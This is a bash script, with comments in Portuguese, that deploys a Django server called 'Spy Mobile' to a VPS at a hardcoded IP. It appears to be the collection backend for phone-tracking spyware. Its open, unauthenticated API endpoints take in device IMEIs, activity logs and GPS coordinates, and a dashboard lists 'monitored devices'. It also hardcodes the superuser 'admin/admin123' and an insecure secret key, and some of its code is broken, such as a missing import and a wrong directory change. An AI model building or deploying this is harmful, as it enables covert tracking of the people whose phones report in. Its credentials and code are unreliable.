#!/bin/bash
# 🚀 SCRIPT COMPLETO PARA SUBIR DJANGO NA VPS
# IP: 147.79.111.118

echo "🚀 CONFIGURANDO DJANGO NA VPS"
echo "=============================="

# Atualizar sistema
echo "📦 Atualizando sistema..."
apt update && apt upgrade -y

# Instalar dependências
echo "📦 Instalando dependências..."
apt install -y python3 python3-pip python3-venv nginx supervisor git

# Criar usuário para aplicação
echo "👤 Criando usuário django..."
useradd -m -s /bin/bash django || echo "Usuário já existe"

# Criar diretório da aplicação
echo "📁 Criando diretórios..."
mkdir -p /var/www/spy
chown django:django /var/www/spy

# Criar ambiente virtual
echo "🐍 Criando ambiente virtual..."
cd /var/www/spy
python3 -m venv venv
source venv/bin/activate

# Instalar Django e dependências
echo "📦 Instalando Django..."
pip install django requests pillow gunicorn

# Criar projeto Django
echo "🏗️ Criando projeto Django..."
django-admin startproject spy .
cd spy
python manage.py startapp monitoramento

# Configurar settings.py
echo "⚙️ Configurando settings.py..."
cat > spy/settings.py << 'EOF'
import os
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = 'django-insecure-spy-mobile-key-change-in-production'

DEBUG = False

ALLOWED_HOSTS = ['147.79.111.118', 'localhost', '127.0.0.1']

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'monitoramento',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'spy.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'spy.wsgi.application'

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': BASE_DIR / 'db.sqlite3',
    }
}

LANGUAGE_CODE = 'pt-br'
TIME_ZONE = 'America/Sao_Paulo'
USE_I18N = True
USE_TZ = True

STATIC_URL = '/static/'
STATIC_ROOT = '/var/www/spy/static/'

MEDIA_URL = '/media/'
MEDIA_ROOT = '/var/www/spy/media/'

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

CSRF_TRUSTED_ORIGINS = ['http://147.79.111.118', 'https://147.79.111.118']
EOF

# Configurar URLs principais
echo "🔗 Configurando URLs..."
cat > spy/urls.py << 'EOF'
from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', include('monitoramento.urls')),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
EOF

# Criar models.py
echo "📊 Criando models..."
cat > monitoramento/models.py << 'EOF'
from django.db import models
import json

class Dispositivo(models.Model):
    imei = models.CharField(max_length=20, unique=True)
    ip = models.GenericIPAddressField()
    nome = models.CharField(max_length=100, blank=True)
    usuario = models.CharField(max_length=100, blank=True)
    modelo = models.CharField(max_length=100, blank=True)
    status = models.CharField(max_length=20, choices=[('ativo', 'Ativo'), ('inativo', 'Inativo')], default='ativo')
    criado_em = models.DateTimeField(auto_now_add=True)
    ultima_conexao = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.nome or self.imei} ({self.ip})"

class Atividade(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='atividades')
    descricao = models.TextField()
    data_hora = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.dispositivo} - {self.data_hora}"

class Localizacao(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='localizacoes')
    latitude = models.FloatField()
    longitude = models.FloatField()
    data_hora = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.dispositivo} - {self.latitude}, {self.longitude}"
EOF

# Criar views.py
echo "👁️ Criando views..."
cat > monitoramento/views.py << 'EOF'
import json
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from .models import Dispositivo, Atividade, Localizacao
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login

@csrf_exempt
@require_http_methods(["GET"])
def api_test(request):
    return JsonResponse({'status': 'success', 'message': 'API funcionando na VPS'})

@csrf_exempt
@require_http_methods(["POST"])
def api_atividade(request):
    try:
        data = json.loads(request.body)
        imei = data.get('imei', 'dispositivo_desconhecido')
        descricao = data.get('descricao', 'Atividade automática')

        dispositivo = Dispositivo.objects.filter(imei=imei).first()
        if not dispositivo:
            dispositivo = Dispositivo.objects.create(
                imei=imei,
                ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
            )

        Atividade.objects.create(dispositivo=dispositivo, descricao=descricao)
        return JsonResponse({'status': 'success'})
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_localizacao(request):
    try:
        data = json.loads(request.body)
        imei = data.get('imei', 'dispositivo_desconhecido')
        latitude = data.get('latitude')
        longitude = data.get('longitude')

        dispositivo = Dispositivo.objects.filter(imei=imei).first()
        if not dispositivo:
            dispositivo = Dispositivo.objects.create(
                imei=imei,
                ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
            )

        Localizacao.objects.create(
            dispositivo=dispositivo,
            latitude=latitude,
            longitude=longitude
        )
        return JsonResponse({'status': 'success'})
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

@login_required
def lista_dispositivos(request):
    dispositivos = Dispositivo.objects.all().order_by('-ultima_conexao')
    return render(request, 'lista_dispositivos.html', {'dispositivos': dispositivos})

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = authenticate(request, username=username, password=password)
        if user:
            login(request, user)
            return redirect('lista_dispositivos')
    return render(request, 'login.html')
EOF

# Criar URLs da app
echo "🔗 Criando URLs da app..."
cat > monitoramento/urls.py << 'EOF'
from django.urls import path
from . import views

urlpatterns = [
    path('', views.lista_dispositivos, name='lista_dispositivos'),
    path('login/', views.login_view, name='login'),
    path('api/test/', views.api_test, name='api_test'),
    path('api/atividade/', views.api_atividade, name='api_atividade'),
    path('api/localizacao/', views.api_localizacao, name='api_localizacao'),
]
EOF

# Criar templates
echo "🎨 Criando templates..."
mkdir -p monitoramento/templates
cat > monitoramento/templates/login.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Login - Spy Mobile</title></head>
<body>
<h1>Login Spy Mobile VPS</h1>
<form method="post">
    {% csrf_token %}
    <input type="text" name="username" placeholder="Usuário" required>
    <input type="password" name="password" placeholder="Senha" required>
    <button type="submit">Entrar</button>
</form>
</body>
</html>
EOF

cat > monitoramento/templates/lista_dispositivos.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Dispositivos - Spy Mobile VPS</title></head>
<body>
<h1>Dispositivos Monitorados - VPS</h1>
<table border="1">
<tr><th>IMEI</th><th>IP</th><th>Status</th><th>Última Conexão</th></tr>
{% for d in dispositivos %}
<tr><td>{{d.imei}}</td><td>{{d.ip}}</td><td>{{d.status}}</td><td>{{d.ultima_conexao}}</td></tr>
{% endfor %}
</table>
</body>
</html>
EOF

# Aplicar migrações
echo "🗄️ Aplicando migrações..."
python manage.py makemigrations
python manage.py migrate

# Criar superusuário
echo "👤 Criando superusuário..."
echo "from django.contrib.auth.models import User; User.objects.create_superuser('admin', 'admin@spy.com', 'admin123')" | python manage.py shell

# Coletar arquivos estáticos
echo "📁 Coletando arquivos estáticos..."
python manage.py collectstatic --noinput

# Configurar Gunicorn
echo "🦄 Configurando Gunicorn..."
cat > /etc/supervisor/conf.d/spy.conf << 'EOF'
[program:spy]
command=/var/www/spy/venv/bin/gunicorn --workers 3 --bind 0.0.0.0:8000 spy.wsgi:application
directory=/var/www/spy
user=django
autostart=true
autorestart=true
redirect_stderr=true
stdout_logfile=/var/log/spy.log
EOF

# Configurar Nginx
echo "🌐 Configurando Nginx..."
cat > /etc/nginx/sites-available/spy << 'EOF'
server {
    listen 80;
    server_name 147.79.111.118;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location /static/ {
        alias /var/www/spy/static/;
    }

    location /media/ {
        alias /var/www/spy/media/;
    }
}
EOF

# Ativar site
ln -sf /etc/nginx/sites-available/spy /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Ajustar permissões
echo "🔐 Ajustando permissões..."
chown -R django:django /var/www/spy
chmod -R 755 /var/www/spy

# Reiniciar serviços
echo "🔄 Reiniciando serviços..."
systemctl reload supervisor
supervisorctl reread
supervisorctl update
supervisorctl start spy
systemctl restart nginx

# Configurar firewall
echo "🔥 Configurando firewall..."
ufw allow 22
ufw allow 80
ufw allow 8000
ufw --force enable

echo "✅ DJANGO CONFIGURADO NA VPS!"
echo "🌐 Acesse: http://147.79.111.118"
echo "🔑 Login: admin / admin123"
echo "📡 API Test: http://147.79.111.118/api/test/"